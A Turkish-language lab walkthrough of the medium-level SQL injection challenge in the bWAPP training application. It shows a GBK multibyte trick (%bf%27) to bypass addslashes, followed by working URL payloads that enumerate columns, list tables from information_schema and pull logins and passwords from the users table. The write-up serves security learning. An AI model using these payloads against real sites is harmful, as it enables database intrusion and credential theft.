## bWAAP SQL Injection (GET/Search) Level Medium
Movies kısmına `'` karakteri koyuyoruz ve hata alamadığımız görüyoruz.
![](/images/first.PNG)
Bundan anlıyoruz ki `'` işaretini escapliyor. SQL sorgumuzun oluştuğu son hal ise aşağıdaki gibi olmaktadır;
```SQL
SELECT * FROM movies WHERE mname LIKE '%\'%'
```
Burada PHP tarafinda addslashes fonksiyonunun kullanıldığını görebiliriz challenge da bu fonksiyonu baypaslayabilmek için mysql char setimizin `character-set-server=GBK` şeklinde olması gereklidir.

###### MYSQL CHARSET AYARI

XAMPP yönetim panelinden my.ini konfigürasyon dosyasını açalım ve character-set-server’ı GBK olarak değiştirelim.

###### Addslashes

[Ömer Çıtak](https://omercitak.com/):
>Hex karşılığı 0xbf5c olan “¿\” karakteri, utf 8 charsetinde 2 karakter, GBK charsetinde 1 karakter olarak algılanıyor. İnjection saldırısında sorguya tek tırnak, yani 0x27 gönderdiğiniz vakit mysql_real_escape_string veya addslashes fonksiyonlarımız bizim tırnağımızı “\’” haline çeviriyor. Tırnaktan önce “¿” (0xbf) karakterini gönderdiğimizde yani “¿’” (0xbf27) karakterini gönderdiğimizde, tırnaktan önce \ eklendiğinden gönderdiğimiz karakter “¿\’” (0xbf5c27) halini alıyor. GBK charseti “¿\” karakterini tek karakter olarak aldıladığından sondaki tırnağımız boşa çıkıyor, böylece sorgunun gidişatını değiştirmiş oluyorsunuz. Sonrasında injection ile sorguyu istediğimiz şekle sokabiliriz.

###### bWAAP SQL Injection (GET/Search)

Uygulamamızda rast gele birşeyler aratalım ve urlin title kısmını `title=%bf%27` olarak değiştirlerim.
![](/images/error.jpeg)
tek tırnak işaretimiz fazla olduğu için sql hatası aldık.Url in title kısmını `title=%bf%27or1=1--+` değiştirir isek artık hata almadığımızı ve iki koşuldan birisi doğru olduğu için tüm filimleri görmüş oluyoruz.

![](/images/or1=1.jpeg)

Tablomuzun kolon sayısını öğrenmek için `title=%bf%27GROUP BY (değer)--+` değer kısmını uygulama hata verene kadar bir bir arttıralım ve hata verdikten bir önceki sayıymız koln sayımızdır.
Koln sayımızı bulduğumuza göre UNION sorgumuzu çalıştırabliriz.Tablo isimlerini bulmak için information_schema tablosunu kullanıyoruz. `title=%bf%27%20UNION%20SELECT%20NULL,table_name,NULL,NULL,NULL,NULL,NULL%20FROM%20information_schema.tables--+`
![](/images/tables.jpeg)
Sırada colum isimini bulamız gerekli ama bunu malesef ki başaramıyoruz çünkü tırnak karakterini escaplemek için `%bf`kullanmamız gerekli ve bu karakter tablo ismimizin içnie giriyor ve tablo ismimizi bozuyor.

Örnek:table_name='' olarak string içine yazmamız gerek tablo ismi aşşağıdaki gibi tablo ismimizin sonuna %bf karakteri geliyor.
**`title=%bf%27%20UNION%20SELECT%20NULL,column_name,NULL,NULL,NULL,NULL,NULL%20FROM%20information_schema.columns WHERE `_table_name=%bf%27tablename%bf%27--+**

Users isminde tablo bulduğumiz için klonları tahmin edebliriz.titleımızı değiştirerek kullanıcı adı ve parolamızı çekiyoruz. `title=%bf%27%20UNION%20SELECT%20NULL,login,password,NULL,NULL,NULL,NULL%20FROM%20users--+`
![](/images/users.jpeg)
